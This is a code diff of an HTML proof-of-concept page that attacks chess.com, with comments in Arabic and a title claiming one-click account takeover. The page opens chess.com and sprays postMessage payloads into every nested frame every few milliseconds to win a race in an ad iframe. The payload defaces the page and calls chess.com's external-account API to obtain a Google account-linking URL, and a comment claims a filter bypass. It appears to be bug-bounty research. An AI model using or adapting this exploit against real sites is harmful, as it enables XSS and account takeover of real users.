@@ -2,60 +2,105 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Chess.com Recon Attack</title>
+    <title>Chess.com 1-Click ATO PoC</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 100px; }
-        button { padding: 15px 30px; font-size: 20px; background-color: #e53e3e; color: white; border: none; cursor: pointer; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            text-align: center; 
+            padding: 100px; 
+            background-color: #1a202c; 
+            color: #fff;
+        }
+        button { 
+            padding: 15px 40px; 
+            font-size: 22px; 
+            background-color: #e53e3e; 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3); 
+            transition: 0.3s;
+        }
+        button:hover { 
+            background-color: #c53030; 
+            transform: translateY(-2px);
+        }
+        p { font-size: 18px; color: #a0aec0; }
     </style>
 </head>
 <body>
-    <h1>Chess.com FATO Recon</h1>
-    <button onclick="startAttack()">Extract Sensitive Data</button>
+    <h1>Chess.com Critical XSS to ATO</h1>
+    <p>Click the button below to launch the exploit. Keep the new tab focused.</p>
+    
+    <button onclick="startExploit()">Launch Exploit</button>
 
-   <script>
-    let payload = `
-        // 1. إثبات بصري لا يمكن تجاهله
-        document.body.innerHTML = '<h1 style="color:red; font-size:100px; text-align:center; margin-top:20%;">PWNED BY HUSSEIN</h1>';
-        document.body.style.backgroundColor = 'yellow';
-        
-        // 2. محاولة تنفيذ الطباعة
-        window.print(); 
-        
-        // get_ext
-    `.replace(/\n/g, ' ');
-
-    function blast(win) {
-        try {
-            // نبعت الرسالة
-            win.postMessage(payload, "*");
+    <script>
+        // 1. الـ Payload النهائي (يحتوي على الإثبات البصري + مخاطبة الـ API)
+        let payload = `
+            console.log('--- STARTING ATO ATTACK ---');
             
-            // recursion للدخول في كل الطبقات
-            for (let i = 0; i < win.frames.length; i++) {
-                blast(win.frames[i]);
-            }
-        } catch(e) {}
-    }
+            // أ. الإثبات البصري (تنبيه + تغيير شكل الصفحة بالكامل)
+            alert('🎯 Critical DOM XSS by Hussein Mahmoud on: ' + document.domain + '\\nChain to Full Account Takeover (ATO) Proven!');
+            document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#1a202c;z-index:999999;color:#e53e3e;font-family:monospace;padding:50px;font-size:30px;text-align:center;padding-top:15%;">CRITICAL XSS <br> BY HUSSEIN <br> ACCOUNT TAKEOVER VECTOR PROVEN</div>';
+            
+            // ب. إثبات الـ ATO (طلب لينك ربط حساب جوجل بدون باسورد)
+            fetch('https://api.chess.com/rpc/chesscom.user_profile.v1.ExternalAccountService/GetAuthUrl', {
+                method: 'POST',
+                mode: 'cors',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Connect-Protocol-Version': '1'
+                },
+                body: JSON.stringify({
+                    "externalAccountType": "EXTERNAL_ACCOUNT_TYPE_GOOGLE"
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('✅ SUCCESS! API Response (Auth URL):', data);
+            })
+            .catch(err => console.error('❌ API Fetch Error:', err));
 
-    function startAttack() {
-        // نفتح الصفحة اللي إنت أكدت إن فيها الإعلانات
-        let victimWin = window.open("https://www.chess.com/", "victim");
+            // ج. تخطي الفلتر
+            // get_ext
+        `.replace(/\n/g, ' '); // دمج الكود في سطر واحد لضمان عمل التعليق بشكل صحيح
 
-        console.log("🚀 Attack started... Spaming for 20 seconds.");
+        let spammer;
 
-        // نضرب كل 5 ملي ثانية (أسرع بمرتين) لمدة 20 ثانية كاملة
-        // ده بيضمن إننا نكسب الـ Race Condition في اللحظة اللي الـ iframe بيتخلق فيها
-        let attackInterval = setInterval(() => {
-            if (victimWin) {
-                blast(victimWin);
-            }
-        }, 5); 
+        // 2. دالة الاختراق العنقودي (الوصول للـ Iframe المخفي)
+        function blast(win) {
+            try { win.postMessage(payload, "*"); } catch(e) {}
+            try {
+                for (let i = 0; i < win.frames.length; i++) {
+                    blast(win.frames[i]);
+                }
+            } catch(e) {}
+        }
 
-        // نوقف الضرب بعد 20 ثانية عشان المتصفح ميهنجش
-        setTimeout(() => {
-            clearInterval(attackInterval);
-            console.log("🏁 Attack finished.");
-        }, 20000);
-    }
-</script>
+        // 3. دالة بدء الهجوم
+        function startExploit() {
+            // فتح صفحة الهدف في نافذة جديدة (لتخطي X-Frame-Options)
+            let victimWin = window.open("https://www.chess.com/member/hussein-e3", "victimWindow");
+
+            // ننتظر 3 ثواني حتى يبدأ الموقع في تحميل الإعلانات
+            setTimeout(() => {
+                console.log("🚀 Spamming payload to win Race Condition...");
+                
+                // نضرب الكود كل 5 ملي ثانية لضمان الفوز بسباق التحميل
+                spammer = setInterval(() => {
+                    if(victimWin) blast(victimWin);
+                }, 5);
+
+                // نوقف الهجوم بعد 20 ثانية
+                setTimeout(() => {
+                    clearInterval(spammer);
+                    console.log("🏁 Attack finished.");
+                }, 20000);
+
+            }, 3000); 
+        }
+    </script>
 </body>
 </html>
